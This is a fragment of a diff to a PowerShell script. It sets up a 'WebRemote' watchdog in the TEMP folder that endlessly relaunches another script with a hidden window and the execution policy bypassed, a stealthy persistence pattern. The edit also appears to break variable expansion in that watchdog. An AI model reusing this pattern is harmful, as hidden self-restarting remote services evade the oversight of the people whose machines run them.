@@ -288,9 +288,9 @@ $serviceName = "WebRemote"
 if (!(Get-Service $serviceName -ErrorAction SilentlyContinue)) {
     try {
         # Create a simple service that restarts our script
-        $serviceScript = @"
+        $serviceScript = @'
 # Service to restart web server
-while (`$true) {
+while ($true) {
     Start-Sleep -Seconds 5
     try {
         Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`""
@@ -298,7 +298,7 @@ while (`$true) {
         Start-Sleep -Seconds 10
     }
 }
-"@
+'@
         $serviceScriptPath = "$env:TEMP\web_service.ps1"
         [System.IO.File]::WriteAllText($serviceScriptPath, $serviceScript)
         
